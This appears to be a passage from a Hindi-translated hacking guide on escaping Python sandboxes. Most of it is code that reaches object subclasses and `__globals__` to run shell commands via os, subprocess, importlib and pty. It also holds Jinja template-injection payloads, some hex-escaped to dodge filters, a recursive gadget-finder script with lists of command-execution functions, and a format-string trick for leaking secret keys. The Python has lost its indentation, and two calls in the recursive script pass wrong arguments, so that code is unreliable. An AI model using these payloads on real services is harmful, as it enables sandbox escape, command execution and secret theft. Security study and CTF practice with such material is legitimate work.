# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**नीचे एक बड़ा फ़ंक्शन है**](./#recursive-search-of-builtins-globals) जहां आप **सैंडबॉक्स को बाईपास करने के लिए दस्तावेज़ों की खोज** कर सकते हैं।

## अनियमित निष्पादन का खोज

यहां मैं बताना चाहता हूँ कि कैसे आसानी से **अधिक खतरनाक फ़ंक्शनलिटीज़ की खोज** की जा सकती है और अधिक विश्वसनीय एक्सप्लॉइट्स की प्रस्तावना की जा सकती है।

#### बाईपास के साथ सबक्लासेस तक पहुंच

इस तकनीक का सबसे संवेदनशील हिस्सा मूल सबक्लासेस तक पहुंचने की क्षमता होती है। पिछले उदाहरणों में इसे `''.__class__.__base__.__subclasses__()` का उपयोग करके किया गया था लेकिन यहां **अन्य संभावित तरीके** भी हैं:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### खतरनाक पुस्तकालयों को खोजना

उदाहरण के लिए, जानते हुए कि पुस्तकालय **`sys`** के साथ **विचित्र पुस्तकालयों को आयातित किया जा सकता है**, आप सभी **मॉड्यूलों की खोज कर सकते हैं जिनमें से कुछ sys को आयातित किया गया है**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
बहुत सारे हैं, और **हमें बस एक ही चाहिए** जिसके माध्यम से कमांडों को निष्पादित किया जा सके:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
हम उन **अन्य पुस्तकालयों** के साथ भी यही काम कर सकते हैं जिन्हें हम जानते हैं कि उन्हें **कमांडों को निष्पादित करने** के लिए उपयोग किया जा सकता है:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
इसके अलावा, हम यह भी खोज सकते हैं कि कौन से मॉड्यूल दुष्ट पुस्तकालयों को लोड कर रहे हैं:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
इसके अलावा, यदि आपको लगता है कि **अन्य पुस्तकालयों** के द्वारा कार्यों को निष्पादित करने के लिए फ़ंक्शन को आह्वान किया जा सकता है, तो हम भी **संभावित पुस्तकालयों में फ़ंक्शन के नामों द्वारा फ़िल्टर कर सकते हैं**:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## बिल्टिन्स, ग्लोबल्स की पुनरावृत्ति खोज

{% hint style="warning" %}
यह सिर्फ **शानदार** है। यदि आप **ग्लोबल्स, बिल्टिन्स, ओपन या कुछ भी** जैसे ऑब्जेक्ट की तलाश में हैं, तो इस स्क्रिप्ट का उपयोग करके आप उस ऑब्जेक्ट को खोजने के लिए स्थानों की पुनरावृत्ति कर सकते हैं।
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
आप इस स्क्रिप्ट का आउटपुट इस पेज पर चेक कर सकते हैं:

{% content-ref url="broken-reference" %}
[टूटी हुई लिंक](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे संगठनों को खोजें जो सबसे अधिक मायने रखते हैं ताकि आप उन्हें तेजी से ठीक कर सकें। इंट्रूडर आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, मुद्दों को खोजता है। [**इसे नि: शुल्क में ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) आज ही।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format String

यदि आप python को एक **स्ट्रिंग** भेजते हैं जो **फॉर्मेट किया जाएगा**, तो आप `{}` का उपयोग करके **python आंतरिक जानकारी तक पहुंच सकते हैं।** आप पिछले उदाहरणों का उपयोग करके ग्लोबल या बिल्टिन्स तक पहुंच सकते हैं।

{% hint style="info" %}
हालांकि, यहां एक **सीमा** है, आप केवल `.[]` चिह्नों का उपयोग कर सकते हैं, इसलिए आप **विचारशील कोड को नहीं चला सकेंगे**, केवल जानकारी पढ़ने के लिए।\
_**यदि आप इस संकट के माध्यम से कोड चलाने के बारे में जानते हैं, तो कृपया मुझसे संपर्क करें।**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
नोट करें कि आप एक साधारित तरीके से **एट्रिब्यूट तक पहुंच सकते हैं** जैसे कि `people_obj.__init__` और **डिक्शनरी तत्व** को **बिना कोट्स के परेंथेसिस** के साथ `__globals__[CONFIG]`

इसके अलावा ध्यान दें कि आप `.__dict__` का उपयोग करके ऑब्जेक्ट के तत्वों को गणना कर सकते हैं `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

फॉर्मेट स्ट्रिंग के कुछ और रोचक विशेषताएं हैं जैसे कि **`str`**, **`repr`** और **`ascii`** के **`!s`**, **`!r`**, **`!a`** को जोड़कर निर्दिष्ट ऑब्जेक्ट में **कार्यों को क्रियान्वित** करने की संभावना है:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
इसके अलावा, क्लास में **नए फॉर्मेटर्स कोड करना संभव** है:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**और उदाहरण** **format** **string** के बारे में [**https://pyformat.info/**](https://pyformat.info) में मिल सकते हैं।

{% hint style="danger" %}
